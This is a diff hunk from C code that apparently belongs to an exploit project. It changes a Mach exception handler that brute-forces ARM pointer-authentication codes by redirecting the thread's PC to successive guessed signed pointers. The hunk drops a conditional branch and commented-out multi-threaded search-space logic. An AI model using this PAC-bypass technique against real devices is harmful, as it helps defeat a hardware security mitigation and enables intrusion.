@@ -195,30 +195,8 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         (ptrL == ptrR || code[1] == 0xffffffffffffffff)) {
         uint32_t diversifier = old_state->__flags & 0xFF000000;
         tinfo->lastDiversifier = diversifier;
-        if (signed_pointer == 0) {
-            // each thread starts at different offset in 24 bits
-            // t0: [0,1,2,3,...], t1: [4M,4M+1,4M+2,...], etc.
-
-            // static int total_threads = 0;
-            // if (total_threads == 0) {
-            //     int mib[2] = {CTL_HW, HW_NCPU};
-            //     int cpu_count = 1;
-            //     size_t len = sizeof(cpu_count);
-            //     sysctl(mib, 2, &cpu_count, &len, NULL, 0);
-            //     total_threads = (cpu_count > 0 && cpu_count <= 8) ? cpu_count : 1;
-            // }
-            //
-            // uint64_t base_pac = ((uint64_t)brX8Address & 0xFFFFFFFFF);
-            // uint64_t search_space = 1ULL << 24; // 24-bit PAC space
-            // uint64_t thread_offset = (tinfo->thread_id * (search_space / total_threads)) + tinfo->pacFailedCount;
-            // uint64_t pac_value = thread_offset & (search_space - 1); // wraparound
-            //
-            // tinfo->pacBruteForcedPtr = base_pac | ((pac_value << 39) & ~0x0080000000000000);
-            tinfo->pacBruteForcedPtr = ((uint64_t)brX8Address & 0xFFFFFFFFF) | ((tinfo->pacFailedCount << 39) & ~0x0080000000000000);
-        } else if (signed_pointer == tinfo->pacBruteForcedPtr) {
-            tinfo->pacBruteForcedPtr = signed_pointer;
-        }
-
+        tinfo->pacBruteForcedPtr = ((uint64_t)brX8Address & 0xFFFFFFFFF) | ((tinfo->pacFailedCount << 39) & ~0x0080000000000000);
+       
         tinfo->new_state->__pc = tinfo->pacBruteForcedPtr;
         tinfo->pacFailedCount++;
         if ((tinfo->pacFailedCount & 0x5ffff) == 0) {
